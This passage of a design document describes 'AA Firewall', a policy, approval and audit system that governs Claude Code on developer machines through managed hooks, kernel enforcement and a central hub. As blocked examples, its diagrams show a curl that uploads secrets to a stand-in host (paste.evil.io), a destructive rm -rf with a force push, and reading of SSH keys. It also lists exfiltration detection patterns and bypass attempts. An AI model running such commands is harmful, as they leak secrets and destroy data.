| **In-process buffer** | Go in-memory queue | Decouples event emission from synchronous INSERT. Not durable -- feeds PostgreSQL via flush service. | Until flushed |
| **Central store** | PostgreSQL with JSONB event table | Primary query store for review console. Append-only (no UPDATE/DELETE on event rows). Event IDs generated via `gen_random_uuid()`. Decision values normalized (strips ":REASON" suffix before storage). Query API uses unlimited default limit. `COALESCE` used for NULL decision scanning in aggregate queries. | Configurable per org (default: 90 days for prototype) |

> **PostgreSQL implementation details:**
> - **Event IDs:** `gen_random_uuid()` at the database level, not application-generated UUIDs
> - **Decision normalization:** Incoming decisions like `"deny:PATH_OUTSIDE_PROJECT_ROOT"` are stripped to `"deny"` before storage; the reason suffix is stored separately
> - **Query limits:** No default LIMIT on audit event queries (unlimited), caller must specify if needed
> - **NULL handling:** `COALESCE` used for NULL decision scanning in aggregate/analytics queries

### 9.4 Indexes

- `session_id` — for session replay
- `actor.user_id` — for per-developer review
- `policy.decision` — for filtering denied/approval-required events
- `timestamp` — for time-range queries
- `resource.kind` + `action.type` — for surface-specific filtering

---

## 10. Approval Service Design

### 10.1 Lifecycle

The approval flow is **non-blocking by design**. The hook handler exits immediately with code 2 when approval is required -- the developer is not frozen. The Sentinel client agent syncs pending approvals to the Hub every 3 seconds. When an admin resolves the approval on the Hub Console (port 9201), the resolved decision piggybacks on the next client sync response and the local daemon registers a **single-use pre-approval scope**. On developer retry, the scope matches and the action is allowed.

```
Action intercepted
       │
       ▼
Policy evaluates to "require_approval"
       │
       ▼
Daemon creates approval request (PendingEntry keyed by approval_id)
Hook handler exits code 2 immediately (non-blocking)
       │
       ├──► Sentinel client agent pushes to Hub every 3s (mTLS)
       │         │
       │         ▼ Hub Console (port 9201) shows pending request
       │
       ├──► VS Code extension shows in-IDE prompt (Phase 2)
       │
       └──► Web console shows pending request (fallback)
       │
       ▼
Reviewer sees context bundle:
  - Action: "rm -rf node_modules"
  - Resource: /Users/dev/project (shell command)
  - Policy rule: org.approve_destructive_commands
  - Risk rationale: "Matches destructive command pattern"
  - Agent: claude_code (vscode_ext_1)
  - Session history: 12 actions so far, 0 prior blocks
       │
       ├──► APPROVE (with optional rationale, optional scope)
       │         │
       │         ▼ Daemon registers single-use pre-approval scope.
       │           On developer retry, scope matches and action is allowed.
       │           Audit event records approval.
       │
       ├──► DENY (with optional rationale)
       │         │
       │         ▼ Action blocked. Audit event records denial.
       │
       └──► TIMEOUT (no response within configured window)
                 │
                 ▼ Configurable: deny-on-timeout (default for high-risk)
                   or allow-on-timeout (only if explicitly configured)
```

### 10.2 Approval Features

| Feature | Description |
|---|---|
| **Time-bounded scope** | "Approve this action for the next 30 minutes" — avoids repeated prompts for the same operation |
| **Reusable approval window** | "Approve all npm installs from registry.npmjs.org for this session" — reduces approval fatigue for repetitive safe operations |
| **Break-glass access** | Emergency override that bypasses normal approval routing. Logged with elevated severity. Requires explicit rationale. |
| **Configurable timeout** | Default: 5 minutes. deny-on-timeout for actions matching high-risk patterns. allow-on-timeout only where admin explicitly configures it. |

### 10.3 Approval API

```
POST /v1/approvals                    # Create approval request
GET  /v1/approvals/:id                # Get approval status + context
POST /v1/approvals/:id/resolve        # Approve or deny
GET  /v1/approvals/pending            # List pending approvals (for console)
```

### 10.4 Performance Targets

| Metric | Target |
|---|---|
| Approval request delivered to reviewer | <2 seconds from policy decision |
| Decision enforced after reviewer action | <1 second |
| Approval prompt render in VS Code | <500ms from daemon notification |

---

## 11. VS Code Extension Design

### 11.1 Responsibilities

- Register Claude Code hooks (`pre_tool_call`, `post_tool_call`) on extension activation.
- Receive approval requests from daemon via WebSocket or polling.
- Render approval prompts as VS Code notifications or webview panels with context bundle.
- Show policy decision status in the status bar (governed session active, action count, blocks).
- Link to review console for full session history.

### 11.2 Approval Prompt UX

When an approval is required, the extension shows:

```
┌─────────────────────────────────────────────────────┐
│  ⚠ AA Firewall — Approval Required                  │
│                                                     │
│  Action:   rm -rf node_modules                      │
│  Surface:  Shell command                            │
│  Policy:   org.approve_destructive_commands         │
│  Risk:     Matches destructive command pattern      │
│  Agent:    Claude Code (session: sess_abc123)       │
│                                                     │
│  [ Approve ]  [ Approve for session ]  [ Deny ]    │
│                                                     │
│  Rationale (optional): ________________________     │
└─────────────────────────────────────────────────────┘
```

### 11.3 Status Bar

```
$(shield) AA Firewall: 47 actions | 2 blocked | 1 pending approval
```

---

## 12. Review Console Design

### 12.1 Views

| View | Purpose |
|---|---|
| **Dashboard** | Aggregate metrics: sessions governed, actions mediated, blocks, approvals, audit completeness rate. |
| **Analytics** | Stack-ranked blocked operations, developer groups, friction heatmap, one-click recommendations. Drill-down navigates to Search with pre-populated filters. |
| **Search/filter** | Filter events by session, actor, action type, resource, decision, time range, risk level. Drill-down navigates to Session detail. |
| **Session detail** | Full event chain for a single session: chronological timeline, approval history, blocked actions with rationale. Reached via Analytics -> Search -> Session detail navigation (no inline drilldown). |
| **Session timeline** | Chronological list of all actions in a session with policy decisions, approvals, and outcomes. The primary review surface. |
| **Export** | Export session or time-range as JSON evidence package for compliance or incident response. |

> **Navigation flow:** Analytics dashboards link to Search with pre-populated filters. Search results link to Session detail. There is no inline drill-down from Analytics directly to session detail -- the drill-down path is always Analytics -> Search -> Session detail.

### 12.2 UI Stack

> **Dual builds:** The same Next.js codebase produces two static exports: `out-hub` (for Hub Console on port 9201) and `out-sentinel` (for Sentinel Console on port 9100). The `isHubMode()` function detects which mode is active at runtime, enabling separate navigation, feature sets, and `governed_user` filtering. Both builds are embedded in Go binaries via `go:embed`.

| Layer | Technology | Purpose |
|---|---|---|
| Framework | Next.js 15 (App Router) | Server components for data fetching, API routes for audit queries, fast page transitions |
| Components | shadcn/ui (Radix primitives) | Accessible, composable components: DataTable, Card, Badge, Dialog, Command, Sheet, Tabs, Tooltip |
| Styling | Tailwind CSS | Utility-first styling, dark mode support, consistent design tokens |
| Charts | Recharts or Tremor | Dashboard metrics visualization (mediation rate, latency histograms, block counts) |
| Icons | Lucide React | Consistent icon set matching shadcn/ui |
| State | React Server Components + SWR for client polling | Server components for initial data, SWR for real-time approval status polling |

### 12.3 Console Pages and Components

> **Dual builds:** The same codebase produces Hub Console (`out-hub`) and Sentinel Console (`out-sentinel`). Hub-only pages (Analytics, Approvals admin, Policies CRUD, Clients) are excluded from the Sentinel build. The `isHubMode()` function controls which navigation items and features are available. The Sentinel Console enforces `governed_user` filtering -- each developer sees only their own data.

| Page | Route | Hub/Sentinel | Key Components | Description |
|---|---|---|---|---|
| **Dashboard** | `/` | Both | Cards (metric KPIs), AreaChart (action volume over time), BarChart (decisions by type), Badge (gate pass/fail) | Landing page showing readiness gate metrics, action volume trends, decision breakdown, and alert count. The first thing a security reviewer or CISO sees. |
| **Analytics** | `/analytics` | Hub only | Stack-ranked blocked ops, developer groups donut chart, friction heatmap, one-click recommendations | Enterprise analytics dashboard. Drill-down navigates to `/search` with pre-populated filters (no inline drilldown). |
| **Sessions** | `/sessions` | Both | DataTable (sortable, filterable), Badge (decision color), CommandPalette (quick search) | List of agent sessions with columns: session ID, agent, user, start time, action count, blocks, approvals. Click to drill into timeline. Sentinel shows only the `governed_user`'s sessions. |
| **Session Timeline** | `/sessions/:id` | Both | Timeline component (vertical, chronological), Cards (per-event detail), Badge (allow=green, deny=red, approval=amber), Sheet (slide-out full JSON), Tabs (timeline/raw/export) | The primary review surface. Each event rendered as a card with: timestamp, action type icon, resource, decision badge, approval status. Clicking a card opens a slide-out with the full audit event JSON. |
| **Approvals** | `/approvals` | Hub only | DataTable (pending/resolved), Dialog (approval detail with context bundle), Badge (status) | Live list of pending and resolved approvals. Pending approvals show context bundle and approve/deny buttons. Admin resolves approvals via Hub Console (port 9201). |
| **Search** | `/search` | Both | CommandPalette (global search), Filters (actor, action type, decision, time range, resource), DataTable (results) | Full audit search across all sessions. Filters map to `/v1/audit/events` query parameters. Accepts pre-populated URL params from Analytics drill-down. Click row to navigate to Session detail. |
| **Export** | `/export` | Both | DateRangePicker, FilterSelector, Button (download JSON) | Generate and download evidence packages for a session, time range, or filter set. Includes metadata header. |
| **Policies** | `/policies` | Hub only | DataTable (active rules), Badge (effect type), CodeBlock (YAML preview), CRUD (admin only) | Policy management with 13 default rules, 8 canned packs, create-from-template. Admin role required for CRUD. |
| **Clients** | `/clients` | Hub only | DataTable (registered Sentinels), Badge (health status), heartbeat timestamps | Fleet overview of all registered Sentinel agents with health monitoring. |
| **Developer Scorecard** | `/developer/:id` | Both | Compliance score, group badge (professional name from `groupMetadata`), `governed_user` (OS username), trends, tips | Per-developer scorecard. Hub shows any developer; Sentinel shows only the local `governed_user`. |

### 12.4 Design Language

| Element | Treatment |
|---|---|
| **Decision badges** | `allow` = green/emerald, `deny` = red/destructive, `require_approval` = amber/warning, `blocked` = red with strikethrough icon, `bypass_detected` = red pulsing |
| **Action type icons** | File = FileText, Shell = Terminal, Network = Globe, MCP = Puzzle, Approval = ShieldCheck |
| **Dark mode** | Default. Security reviewers work in dark IDEs. The console should match. Light mode available via toggle. |
| **Typography** | Monospace for commands, paths, and policy IDs. Sans-serif for everything else. |
| **Density** | Compact tables — security reviewers scan many events. No excessive whitespace. |
| **Color system** | Tailwind slate palette for backgrounds, emerald/red/amber for semantic status, blue for interactive elements |

---

## 13. Secure Container Mode

### 13.1 Configuration Profile

| Setting | Value | Rationale |
|---|---|---|
| Root filesystem | Read-only where possible | Prevents persistence outside mounted workspace |
| Volume mounts | Project directory only (bind mount, rw) | Limits blast radius to project scope |
| User | Non-root (mapped via user namespace) | Reduces privilege escalation risk |
| Capabilities | All dropped except minimal set | Least privilege |
| Network | Routed through AA Firewall network proxy | Ensures egress governance |
| Docker socket | Never mounted | Prevents container escape via daemon control |
| Privileged mode | Forbidden | AA Firewall refuses to start in privileged containers |

### 13.2 Container Startup

1. AA Firewall daemon starts on host.
2. Docker container launched with hardened profile.
3. Project directory mounted into container.
4. `HTTP_PROXY`/`HTTPS_PROXY` set to point to host network proxy.
5. Claude Code agent runs inside container.
6. All enforcement points (FS guard, shell proxy) active inside container, reporting to daemon on host.

---

## 13A. Management Hub and Sentinel Agent Architecture

### 13A.1 Overview

AA Firewall supports a Management Hub + Sentinel Agent model for enterprise deployment. The Management Hub distributes policies, aggregates audit events, and monitors Sentinel health. Communication is encrypted via mutual TLS (mTLS).

### 13A.2 Architecture

```mermaid
flowchart TB
    subgraph Central["Management Hub (superadmin-managed)"]
        direction TB
        ClientAPI["Client API<br/>(port 9200, mTLS)"]
        AdminAPI["Admin API<br/>(port 9201, HTTPS)"]
        PolicyStore["Policy Store"]
        AuditAgg["Audit Aggregator"]
        Registry["Agent Registry"]
    end

    subgraph Client1["Developer Machine 1"]
        Agent1["Sentinel Agent"]
        Daemon1["AA Firewall Daemon"]
    end

    subgraph Client2["Developer Machine 2"]
        Agent2["Sentinel Agent"]
        Daemon2["AA Firewall Daemon"]
    end

    subgraph Admin["Security Admin"]
        Console["Admin Console"]
    end

    Agent1 -- "register (mTLS)" --> ClientAPI
    Agent1 -- "policy sync (mTLS)" --> ClientAPI
    Agent1 -- "audit forward (mTLS)" --> ClientAPI
    Agent1 -- "heartbeat (30s)" --> ClientAPI

    Agent2 -- "register (mTLS)" --> ClientAPI
    Agent2 -- "policy sync (mTLS)" --> ClientAPI
    Agent2 -- "audit forward (mTLS)" --> ClientAPI
    Agent2 -- "heartbeat (30s)" --> ClientAPI

    Console -- "push policy" --> AdminAPI
    Console -- "view audit" --> AdminAPI
    Console -- "list clients" --> AdminAPI

    ClientAPI --> Registry
    ClientAPI --> PolicyStore
    ClientAPI --> AuditAgg
```

### 13A.3 Certificate Infrastructure

Generated via `scripts/generate-certs.sh`:

| Certificate | Purpose | Location |
|---|---|---|
| CA certificate | Root of trust for mTLS | `certs/ca.crt` |
| Server certificate | Management Hub identity | `certs/server.crt`, `certs/server.key` |
| Client certificate | Sentinel Agent identity | `certs/client.crt`, `certs/client.key` |

### 13A.4 Sentinel Agent Lifecycle

1. **Registration:** Sentinel sends metadata (hostname, user, daemon version) to Management Hub.
2. **Policy sync:** Sentinel fetches latest policy bundle on startup and at configured interval.
3. **Audit forwarding:** Sentinel forwards buffered audit events to Management Hub.
4. **Heartbeat:** Sentinel sends status every 30 seconds. Management Hub marks agents as unhealthy after 3 missed heartbeats.

### 13A.5 Deployment

`scripts/aafirewall_deploy.sh` supports four modes:
- `central` — install and start Management Hub (requires root)
- `client` — install and start Sentinel Agent on developer machine (requires root)
- `full` — install both central and client on the same machine
- `uninstall` — stop services and remove configuration

---

## 13A-2. Enterprise Deployment Architecture

### 13A-2.1 Overview

In enterprise deployment, the AA Firewall Management Hub runs on a security team-managed server while Sentinel Agents run as privileged services on developer machines. The Sentinel daemon controls Claude Code through managed hooks and settings files, and enforces governance at the OS kernel level via the KernelEnforcer interface.

### 13A-2.2 Enterprise Deployment Diagram

```mermaid
flowchart TB
    subgraph ManagementHub["Security Team Server"]
        direction TB
        HubAPI["Management Hub<br/>(port 9200, mTLS)"]
        AdminAPI["Admin Console API<br/>(port 9201, HTTPS)"]
        PolicyStore["Policy Store<br/>(signed YAML bundles)"]
        AuditAgg["Audit Aggregator<br/>(PostgreSQL)"]
        AdminUI["Admin Dashboard<br/>(browser)"]

        AdminUI --> AdminAPI
        AdminAPI --> PolicyStore
        AdminAPI --> AuditAgg
        HubAPI --> PolicyStore
        HubAPI --> AuditAgg
    end

    subgraph DevMachine["Developer Machine (macOS / Linux)"]
        direction TB

        subgraph Privileged["Privileged Layer (root / LaunchDaemon)"]
            SentinelAgent["Sentinel Agent<br/>(aafirewall-client)<br/>registration, policy sync,<br/>audit forwarding, heartbeat"]
            Daemon["AA Firewall Daemon<br/>(aafirewall-daemon, port 9100)<br/>policy engine, approval router,<br/>audit buffer, RBAC auth"]
            ManagedHooks["Managed Hooks Config<br/>(/Library/Application Support/<br/>ClaudeCode/managed-settings.json)"]
            ManagedSettings["Claude Code Settings<br/>(allowManagedHooksOnly=true)"]
        end

        subgraph KernelLayer["OS Kernel Enforcement"]
            KernelMod["KernelEnforcer<br/>(eBPF on Linux /<br/>ESF on macOS)"]
            SyscallGate["Syscall Gate<br/>file.open, execve,<br/>connect, bind"]
        end

        subgraph UserSpace["Developer User Space"]
            VSCode["VS Code IDE"]
            ClaudeCode["Claude Code<br/>(Extension or CLI)"]
            HookHandler["Hook Handler<br/>(aafirewall-hook)<br/>PreToolUse / PostToolUse"]
            Terminal["Raw Terminal<br/>(direct shell)"]
        end

        subgraph LocalPersistence["Local Persistence"]
            PG["PostgreSQL<br/>(audit_events,<br/>append-only)"]
        end

        %% Claude Code → Hook Handler → Daemon (IDE enforcement)
        ClaudeCode -- "tool call<br/>(Read/Write/Bash/...)" --> HookHandler
        HookHandler -- "POST /v1/evaluate" --> Daemon
        Daemon -- "allow / deny /<br/>require_approval" --> HookHandler
        HookHandler -- "exit 0 (allow)<br/>exit 2 (deny)" --> ClaudeCode

        %% Managed hooks prevent developer from disabling
        ManagedHooks -. "enforces hooks<br/>on Claude Code" .-> ClaudeCode
        ManagedSettings -. "blocks hook<br/>removal" .-> ClaudeCode

        %% Kernel enforcement (catches what hooks miss)
        Terminal -- "direct syscall" --> SyscallGate
        ClaudeCode -- "OS-level action" --> SyscallGate
        SyscallGate -- "evaluate" --> KernelMod
        KernelMod -- "allow / deny" --> SyscallGate
        KernelMod -- "audit event" --> Daemon

        %% Daemon → PostgreSQL
        Daemon -- "flush events" --> PG

        %% Sentinel Agent ↔ Management Hub (mTLS)
        SentinelAgent -- "policy sync<br/>(mTLS)" --> HubAPI
        SentinelAgent -- "audit forward<br/>(mTLS)" --> HubAPI
        SentinelAgent -- "heartbeat<br/>(30s, mTLS)" --> HubAPI
        SentinelAgent -- "loads policy into" --> Daemon
        Daemon -- "audit events" --> SentinelAgent
    end

    style ManagementHub fill:#1a1a2e,stroke:#e94560,color:#fff
    style Privileged fill:#16213e,stroke:#0f3460,color:#fff
    style KernelLayer fill:#0f3460,stroke:#e94560,color:#fff
    style UserSpace fill:#1a1a2e,stroke:#533483,color:#fff
    style LocalPersistence fill:#16213e,stroke:#0f3460,color:#fff
```

### 13A-2.3 End-to-End Enforcement Workflow

This workflow traces a single agent action from intent to audit across all enforcement layers:

```mermaid
sequenceDiagram
    participant Dev as Developer
    participant CC as Claude Code
    participant Hook as Hook Handler<br/>(aafirewall-hook)
    participant Daemon as AA Firewall Daemon<br/>(privileged, port 9100)
    participant Kernel as KernelEnforcer<br/>(eBPF / ESF)
    participant OS as Operating System
    participant PG as PostgreSQL<br/>(append-only)
    participant Client as Sentinel Agent
    participant Central as Management Hub<br/>(mTLS, port 9200)

    Note over Dev,Central: Layer 1: IDE Hook Enforcement (fastest, intent-aware)

    Dev->>CC: "Delete all test files and push to main"
    CC->>Hook: PreToolUse: Bash("rm -rf tests/ && git push --force origin main")
    Hook->>Daemon: POST /v1/evaluate<br/>{shell.exec, "rm -rf tests/ && git push --force", classification: [destructive]}
    Daemon->>Daemon: Policy: org.approve_destructive_commands<br/>Decision: require_approval
    Daemon-->>Hook: {decision: require_approval, approval_id: apr_001}
    Hook-->>CC: exit 2 — BLOCKED<br/>"Destructive command requires approval"
    CC-->>Dev: "AA Firewall blocked: approval required for rm -rf"
    Daemon->>PG: Audit event: {attempted: "rm -rf tests/", decision: require_approval, observed_effect: pending_approval}

    Note over Dev,Central: Reviewer approves via Hub Console

    Dev->>Daemon: POST /v1/approvals/apr_001/resolve<br/>{decision: approve, approver_id: "security-lead", rationale: "cleanup OK"}
    Daemon->>PG: Enrichment event: {correlation_id: apr_001, decision: approved}

    Note over Dev,Central: Layer 2: OS Kernel Enforcement (tamper-resistant)

    Dev->>CC: (retries after approval) "Delete test files"
    CC->>Hook: PreToolUse: Bash("rm -rf tests/")
    Hook->>Daemon: POST /v1/evaluate {shell.exec, "rm -rf tests/"}
    Daemon->>Daemon: Scope match: apr_001 approved "rm -rf" for session
    Daemon-->>Hook: {decision: allow, reason: SCOPE_APPROVED}
    Hook-->>CC: exit 0 — ALLOWED
    CC->>OS: execve("/bin/rm", ["-rf", "tests/"])
    OS->>Kernel: sys_enter_execve("/bin/rm", ["-rf", "tests/"])
    Kernel->>Kernel: Check: "rm" in denied_execs?<br/>Check: approval scope active?
    Kernel-->>OS: ALLOW (approval verified)
    OS-->>CC: rm completed

    Note over Dev,Central: Layer 3: Bypass Detection (catches ungoverned actions)

    Dev->>OS: (raw terminal) curl https://paste.evil.io < secrets.txt
    OS->>Kernel: sys_enter_connect(paste.evil.io:443)
    Kernel->>Kernel: Check: paste.evil.io in allowed_hosts?<br/>Result: NOT ALLOWED
    Kernel-->>OS: DENY connect()
    Kernel->>Daemon: Audit: {type: network.connect, host: paste.evil.io, decision: deny, source: kernel}
    Daemon->>PG: Audit event: {bypass_attempt, kernel_enforced, severity: critical}

    Note over Dev,Central: Layer 4: Central Aggregation (enterprise visibility)

    Client->>Central: POST /api/v1/audit/push (mTLS)<br/>[all events from this session]
    Central->>Central: Aggregate into central audit store
    Client->>Central: POST /api/v1/heartbeat (mTLS)<br/>{status: online, policy_version: v2026.04.28.1}
    Central-->>Client: {policy_hash: abc123, enforcement_enabled: true}
    Client->>Client: Compare policy hash — no drift detected
```

### 13A-2.4 Defense-in-Depth Layers

| Layer | Mechanism | What It Catches | Bypass Resistance |
|---|---|---|---|
| **1. IDE Hooks** | Claude Code `PreToolUse`/`PostToolUse` hooks → daemon `/v1/evaluate` | All Claude Code tool calls (Read, Write, Bash, WebFetch, etc.) | Low — developer can disable hooks if not managed |
| **2. Managed Hooks** | `/Library/Application Support/ClaudeCode/managed-settings.json` + `allowManagedHooksOnly=true` | Developer attempts to remove or modify hooks | Medium — requires root to modify managed settings |
| **3. Daemon (privileged)** | LaunchDaemon running as root, `KeepAlive=true` | Developer attempts to kill the daemon process | High — auto-restarts, developer cannot stop |
| **4. OS Kernel** | eBPF programs on `sys_enter_openat`, `sys_enter_execve`, `sys_enter_connect` | Direct terminal commands, scripts, any process on the machine | Very High — kernel-level, cannot be bypassed from userspace |
| **5. Management Hub** | mTLS client certificates, policy distribution, audit aggregation | Sentinel Agent tampering, policy drift, audit data loss | Very High — Sentinel cannot impersonate or modify hub policies |

### 13A-2.5 What Each Layer Prevents

```
Developer tries to:                    Caught by:
─────────────────────────────────────  ────────────────────────────
Ask Claude Code to read ~/.ssh/id_rsa  Layer 1 (IDE hook → deny)
Remove AA Firewall hooks               Layer 2 (managed hooks block removal)
Kill the daemon process                 Layer 3 (LaunchDaemon auto-restart)
Open a raw terminal and curl secrets    Layer 4 (kernel blocks connect())
Modify the local policy YAML            Layer 5 (Management Hub detects drift)
Tamper with audit events                Append-only PostgreSQL + hash chain
```

---

## 13B. Secrets/PII Redaction Engine

### 13B.1 Overview

The redaction engine (`src/enforcement/redaction.ts`) scans text for sensitive data patterns and applies configurable redaction before audit storage or context exposure.

### 13B.2 Detection Patterns (20+)

| Category | Patterns | Examples |
|---|---|---|
| **Cloud credentials** | AWS access key, AWS secret key, GCP service account key | `AKIA...`, `aws_secret_access_key` |
| **API tokens** | GitHub token, Slack token, Stripe key, generic API key | `ghp_...`, `xoxb-...`, `sk_live_...` |
| **Authentication** | JWT, Bearer token, Basic auth header | `eyJ...`, `Bearer ...`, `Basic ...` |
| **Cryptographic** | Private keys (RSA/EC/DSA), PGP private blocks | `-----BEGIN RSA PRIVATE KEY-----` |
| **Database** | Connection strings (PostgreSQL, MySQL, MongoDB, Redis) | `postgres://user:pass@host/db` |
| **PII** | Social security numbers, credit card numbers, email addresses | `123-45-6789`, `4111...` |

### 13B.3 Redaction Modes

```mermaid
flowchart LR
    Input["Raw text with<br/>sensitive data"] --> Scan["scanForSecrets()"]
    Scan --> Found{Secrets<br/>found?}
    Found -- "no" --> Pass["Pass through"]
    Found -- "yes" --> Mode{Redaction<br/>mode}
    Mode -- "mask" --> Mask["Replace with<br/>***REDACTED***"]
    Mode -- "tokenize" --> Token["Replace with<br/>TOK_abc123<br/>(reversible)"]
    Mode -- "summarize" --> Summary["Replace with<br/>[DETECTED: aws_key<br/>at position 45]"]
    Mask & Token & Summary --> Verify["verifyNoPlaintextSecrets()"]
    Verify --> Output["Clean text"]
```

### 13B.4 Key Functions

| Function | Purpose |
|---|---|
| `scanForSecrets(text)` | Returns array of `{type, value, start, end}` matches |
| `redactSecrets(text, mode)` | Applies redaction in the specified mode |
| `deTokenize(token)` | Reverses tokenization for authorized recovery |
| `verifyNoPlaintextSecrets(text)` | Returns true if no detectable secrets remain |

---

## 13C. SIEM Integration

### 13C.1 Overview

The SIEM exporter (`src/audit/siem-export.ts`) pushes audit events to external security information and event management systems via three transport protocols.

### 13C.2 Transports

```mermaid
flowchart LR
    Buffer["Audit Buffer"] --> Exporter["SIEM Exporter"]
    Exporter --> WH["Webhook<br/>(HTTP POST)"]
    Exporter --> SL["Syslog<br/>(UDP RFC 5424)"]
    Exporter --> FL["JSONL File<br/>(append-only)"]

    WH --> Splunk["Splunk / Elastic /<br/>Sentinel / etc."]
    SL --> SyslogSvr["Syslog server /<br/>QRadar / etc."]
    FL --> SIEM["File-based<br/>ingestion"]
```

| Transport | Protocol | Configuration | Use Case |
|---|---|---|---|
| **Webhook** | HTTP POST (JSON) | URL, optional auth headers | Cloud SIEMs (Splunk HEC, Elastic, Sentinel) |
| **Syslog** | UDP (RFC 5424) | Host, port | On-prem SIEM appliances (QRadar, ArcSight) |
| **JSONL file** | File append | Path | Air-gapped environments, batch ingestion |

---

## 13D. Anomaly Detection

### 13D.1 Overview

The anomaly detector (`src/intelligence/anomaly.ts`) evaluates sequences of audit events against 8 deterministic patterns that indicate potential security incidents.

### 13D.2 Detection Patterns

```mermaid
flowchart TB
    subgraph Exfiltration["Data Exfiltration Patterns"]
        P1["secret_then_network<br/>(read .env → curl external)"]
        P2["read_then_curl<br/>(file.read → network.request)"]
    end

    subgraph PrivEsc["Privilege Escalation"]
        P3["cred_then_exec<br/>(credential access → shell exec)"]
    end

    subgraph Recon["Reconnaissance"]
        P4["rapid_reads<br/>(>10 file reads in 5s window)"]
    end

    subgraph SupplyChain["Supply Chain"]
        P5["lockfile_then_install<br/>(modify lockfile → package install)"]
    end

    subgraph Destructive["Destructive Actions"]
        P6["multi_delete<br/>(>5 file deletes in window)"]
        P7["force_push_after_reset<br/>(git reset --hard → push --force)"]
    end

    subgraph Evasion["Policy Evasion"]
        P8["denied_then_retry<br/>(denied action → same action retried)"]
    end
```

### 13D.3 How It Works

Each pattern defines a sequence of action types within a time window. The detector maintains a sliding window of recent events per session. When a new event arrives, it checks whether the event + recent history match any pattern. Matches emit an `anomaly_detected` audit event with the pattern name and severity.

---

## 13E. Policy Packs

### 13E.1 Overview

Policy packs (`src/policy/packs.ts`) provide pre-built, industry-standard rule sets that can be applied with a single API call.

### 13E.2 Available Packs

| Pack | Rules | Description |
|---|---|---|
| **Source Code Protection** | 4 | Block writes outside project, sensitive reads, unauthorized repo access |
| **Supply Chain Security** | 3 | Require approval for package installs, lockfile changes, registry switches |
| **Secrets Hardening** | 3 | Deny credential access, block secret file reads, require approval for vault commands |
| **Infrastructure Safety** | 3 | Require approval for destructive commands, block privilege escalation, cloud resource changes |
| **Network Egress Control** | 3 | Block non-allowlisted hosts, require approval for unknown endpoints, block data upload |
| **Compliance (SOC2/HIPAA)** | 3 | Full audit logging, approval for PII access, deny unencrypted data transfer |
| **Developer Best Practices** | 3 | Require approval for force push, block direct production writes, require tests before deploy |
| **MCP Tool Governance** | 3 | Allow only trusted MCP servers, require approval for untrusted tools, block dangerous payloads |

### 13E.3 Applying a Pack

```
POST /v1/policy/packs/:id/apply
```

Adds the pack's rules to the active policy bundle. Existing rules are preserved. Duplicate rule IDs are skipped.

---

## 13F-0. Enterprise Deployment via MDM — "Governance is Always On"

### 13F-0.1 Overview

In enterprise deployment, the security team pushes AA Firewall to developer machines via Mobile Device Management (MDM). The developer never installs anything. They receive a machine where governance is already active. When they open VS Code with the Claude Code extension, the managed hooks fire on every tool call — the developer cannot remove, disable, or modify them.

### 13F-0.2 What MDM Pushes to Each Developer Machine

| Component | File Path | Owner | Purpose |
|---|---|---|---|
| Daemon binary | `/usr/local/bin/aafirewall-daemon` | root:wheel (755) | Policy evaluation, audit, approvals |
| Hook handler binary | `/usr/local/bin/aafirewall-hook` | root:wheel (755) | Called by Claude Code on every tool use |
| Sentinel Agent binary | `/usr/local/bin/aafirewall-client` | root:wheel (755) | Policy sync, audit forward, heartbeat |
| LaunchDaemon plist | `/Library/LaunchDaemons/com.aafirewall.daemon.plist` | root:wheel (644) | Auto-starts daemon at boot, `KeepAlive=true` |
| Managed hooks config | `/Library/Application Support/ClaudeCode/managed-settings.json` | root:wheel (644) | Pre-configures Claude Code hooks |
| Admin token | `/etc/aafirewall/.admin_token` | root:wheel (600) | Admin authentication — developer cannot read |
| Client certificates | `/etc/aafirewall/certs/` | root:wheel (600) | mTLS to Management Hub |
| Policy bundle | `/etc/aafirewall/default.yaml` | root:wheel (644) | Initial policy (updated via central sync) |

### 13F-0.3 Managed Hooks — How Claude Code Becomes Governed

**File: `/Library/Application Support/ClaudeCode/managed-settings.json`**

```json
{
  "hooks": {
    "PreToolUse": [
      {"type": "command", "command": "/usr/local/bin/aafirewall-hook pre_tool_call"}
    ],
    "PostToolUse": [
      {"type": "command", "command": "/usr/local/bin/aafirewall-hook post_tool_call"}
    ]
  },
  "allowManagedHooksOnly": true
}
```

**How this works:**

1. Claude Code reads managed settings from the OS-level system directory on launch
2. `allowManagedHooksOnly=true` means Claude Code ONLY uses hooks from this managed file
3. The developer's personal `~/.claude/settings.json` hooks are IGNORED
4. The developer cannot add, remove, or modify hooks — managed settings take precedence
5. The managed file is owned by root — developer cannot edit without `sudo` (which they don't have in corporate environments)

### 13F-0.4 Lifecycle: From Machine Delivery to Governed Coding

```mermaid
sequenceDiagram
    participant MDM as MDM Server<br/>(Jamf / Intune / Ansible)
    participant Machine as Developer Machine
    participant Daemon as AA Firewall Daemon<br/>(root, port 9100)
    participant Central as Management Hub<br/>(mTLS, port 9200)
    participant VSCode as VS Code + Claude Code
    participant Hook as Hook Handler
    participant Dev as Developer

    Note over MDM,Machine: Phase 1: Machine Provisioning (IT does this once)
    MDM->>Machine: Push binaries, plist, managed-settings.json, certs, token
    Machine->>Daemon: LaunchDaemon starts daemon on boot
    Daemon->>Central: Sentinel Agent registers via mTLS
    Central-->>Daemon: Policy bundle + policy hash

    Note over Dev,Hook: Phase 2: Developer Starts Working (happens every day)
    Dev->>VSCode: Opens VS Code in /Users/dev/project-alpha
    VSCode->>VSCode: Claude Code activates, reads managed-settings.json
    VSCode->>VSCode: Hooks registered: PreToolUse → aafirewall-hook

    Note over Dev,Hook: Phase 3: Every Tool Call is Governed
    Dev->>VSCode: "Refactor the auth module"
    VSCode->>Hook: PreToolUse: Write("src/auth.ts")
    Hook->>Daemon: POST /v1/evaluate {file.write, workspace: /Users/dev/project-alpha}
    Daemon-->>Hook: {decision: allow}
    Hook-->>VSCode: exit 0 (proceed)

    Dev->>VSCode: "Upload code to my server"
    VSCode->>Hook: PreToolUse: WebFetch("https://paste.evil.io")
    Hook->>Daemon: POST /v1/evaluate {network.request, host: paste.evil.io}
    Daemon-->>Hook: {decision: deny, reason: HOST_NOT_ALLOWLISTED}
    Hook-->>VSCode: exit 2 (BLOCKED)
    VSCode-->>Dev: "[AA Firewall] BLOCKED"

    Note over Dev,Hook: Developer cannot disable — hooks are managed, daemon is root
```

### 13F-0.5 MDM Deployment by Platform

| Platform | MDM Tool | Push Method | Managed Settings Path |
|---|---|---|---|
| **macOS** | Jamf Pro, Mosyle, Kandji, Fleet | MDM profile + pkg installer | `/Library/Application Support/ClaudeCode/managed-settings.json` |
